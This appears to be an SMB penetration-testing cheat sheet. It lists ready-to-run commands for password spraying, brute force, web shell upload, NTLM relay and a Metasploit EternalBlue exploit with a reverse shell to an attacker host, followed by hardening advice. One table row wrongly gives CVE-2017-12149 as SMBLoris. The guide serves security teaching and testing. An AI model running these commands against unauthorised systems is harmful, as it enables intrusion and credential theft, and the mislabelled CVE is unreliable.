# 🛰️ SMB Vulnerability Assessment

## Overview
[!ABSTRACT] This document provides a comprehensive guide to identifying and exploiting vulnerabilities within the Server Message Block (SMB) protocol. It covers various attack vectors, detection methods, and defensive measures.

---

## Common SMB Attack Vectors

### 1. Unauthorized File Access
- **Risk**: Data exfiltration, code execution
- **Detection**: Share enumeration
- **Exploitation**: Web shell upload, configuration file modification

### 2. Account Compromise
- **Risk**: Privilege escalation
- **Detection**: Brute force attempts
- **Exploitation**:
```bash
# Password spraying with CrackMapExec
crackmapexec smb target_ip -u users.txt -p 'Password123!'

# Dictionary attack using Hydra
hydra -l user -P passwords.txt smb://target_ip
```

### 3. Excessive Share Permissions
- **Risk**: Unauthorized file access/modification
- **Detection**: Permission enumeration
- **Exploitation**:
```bash
# Enumerate shares and permissions
smbclient -L //target_ip

# Access sensitive files or directories
smbclient //target_ip/share -U user%pass
```

### 4. Information Disclosure
- **Risk**: Sensitive data exposure
- **Detection**: Share browsing, file enumeration
- **Exploitation**:
```bash
# Browsing shares for sensitive information
crackmapexec smb target_ip --shares

# Downloading configuration files
smbclient //target_ip/config -N
```

## SMB Attack Vectors

### 1. Share Exploitation
```bash
# File upload for web shells
smbclient //target/webshare
smb: \> put shell.php

# Configuration file access
smbclient //target/config
smb: \> get database.conf
```

### 2. Password Attacks
```bash
# Hydra SMB brute force
hydra -l user -P passwords.txt smb://target_ip

# CrackMapExec password spraying
crackmapexec smb target_ip -u users.txt -p 'Password123!'
```

### 3. Relay Attacks
```bash
# SMB relay with Responder
responder -I eth0 -A

# ntlmrelayx.py for relay attacks
ntlmrelayx.py -tf targets.txt -smb2support
```

## Common Vulnerabilities

### Critical SMB CVEs

| 🛡️ CVE | 📜 Name | 🚨 Impact | 🏢 Affected Versions |
|--------|---------|-----------|----------------------|
| **CVE-2017-0144** | EternalBlue | Remote Code Execution | Windows Vista - Windows 10, Server 2008-2016 |
| **CVE-2020-0796** | SMBGhost (CoronaBlue) | Remote Code Execution | Windows 10 v1903/v1909, Server v1903/v1909 |
| **CVE-2017-7494** | SambaCry | Remote Code Execution | Samba 3.5.0 - 4.6.4/4.5.10/4.4.14 |
| **CVE-2016-2118** | Badlock | Man-in-the-Middle | Windows/Samba NTLM authentication |
| **CVE-2017-12149** | SMBLoris | Denial of Service | Windows SMB implementations |

### EternalBlue (CVE-2017-0144)
```bash
# Nmap EternalBlue detection
nmap -p445 --script smb-vuln-ms17-010 target

# Metasploit exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# Manual verification
python checker.py target 445
```

### SMBGhost (CVE-2020-0796)
```bash
# Detection script
nmap -p445 --script smb-vuln-cve2020-0796 target

# Proof of concept
python3 cve-2020-0796.py target

# Metasploit module
use auxiliary/scanner/smb/smb_ms20_004
set RHOSTS target
run
```

### SambaCry (CVE-2017-7494)
```bash
# Vulnerability detection
nmap -p445 --script smb-vuln-cve2017-7494 target

# Manual check
smbclient //target/share -N
smb: \> allinfo /path/to/shared/library.so

# Exploitation requirements:
# - Samba version 3.5.0+
# - File upload to SMB share
# - Knowledge of share path on server
```

### Badlock (CVE-2016-2118)
```bash
# NTLM authentication weaknesses
# Man-in-the-middle attacks on SMB authentication
# Affects both Windows and Samba implementations

# Detection
enum4linux-ng.py target -A | grep -i "signing"
rpcclient -N target -c "getdcname"
```

### Additional SMB Vulnerabilities
- **CVE-2008-4250**: MS08-067 Conficker vulnerability
- **CVE-2017-0145**: EternalBlue variant (MS17-010)
- **CVE-2017-0146**: EternalBlue variant (MS17-010)
- **CVE-2019-0708**: BlueKeep (RDP, but often found with SMB)
- **CVE-2020-1472**: Zerologon (NetLogon, SMB-related)

### Vulnerability Scanning
```bash
# Comprehensive SMB vulnerability scan
nmap -p445 --script smb-vuln-* target

# Specific vulnerability checks
nmap -p445 --script smb-vuln-ms17-010 target        # EternalBlue
nmap -p445 --script smb-vuln-cve2020-0796 target    # SMBGhost
nmap -p445 --script smb-vuln-cve2017-7494 target    # SambaCry

# Metasploit auxiliary scanners
use auxiliary/scanner/smb/smb_ms17_010              # EternalBlue scanner
use auxiliary/scanner/smb/smb_ms20_004              # SMBGhost scanner
```

## SMB Enumeration Checklist

### Initial Reconnaissance
- [ ] Port scanning (139, 445)
- [ ] SMB version identification
- [ ] NetBIOS name enumeration
- [ ] Null session testing

### Share Enumeration
- [ ] Share listing and access testing
- [ ] Permission analysis
- [ ] File and directory enumeration
- [ ] Sensitive file discovery

### User Enumeration
- [ ] RID cycling for user discovery
- [ ] User information gathering
- [ ] Group membership analysis
- [ ] Password policy enumeration

### Authentication Testing
- [ ] Anonymous access testing
- [ ] Default credential testing
- [ ] Password spraying
- [ ] Brute force attacks

### Advanced Testing
- [ ] SMB relay attack testing
- [ ] Vulnerability scanning
- [ ] Configuration analysis
- [ ] Privilege escalation vectors

## Tools for SMB Enumeration

### Built-in Tools
```bash
# SMB client
smbclient -L //target_ip

# RPC client
rpcclient -U "" target_ip

# NetBIOS enumeration
nmblookup -A target_ip
```

### Specialized Tools
```bash
# SMBMap
smbmap -H target_ip

# CrackMapExec
crackmapexec smb target_ip --shares

# Enum4Linux-ng
enum4linux-ng.py target_ip -A

# Impacket tools
samrdump.py target_ip
smbexec.py domain/user:pass@target_ip
```

### Nmap Scripts
```bash
# Comprehensive SMB scan
nmap -p445 --script smb-enum-*,smb-vuln-*,smb-os-discovery target_ip
```

## Defensive Measures

### SMB Server Hardening
- **Disable SMBv1** - Use SMBv2/v3 only
- **Restrict anonymous access** - Disable null sessions
- **Implement strong authentication** - Kerberos, NTLM restrictions
- **Use share-level permissions** - Principle of least privilege
- **Enable message signing** - Prevent tampering
- **Regular security updates** - Patch known vulnerabilities

### Network Security
- **Firewall restrictions** - Block SMB ports externally
- **Network segmentation** - Isolate file servers
- **Monitor SMB traffic** - Detect anomalies
- **Implement SMB over VPN** - Secure remote access 

---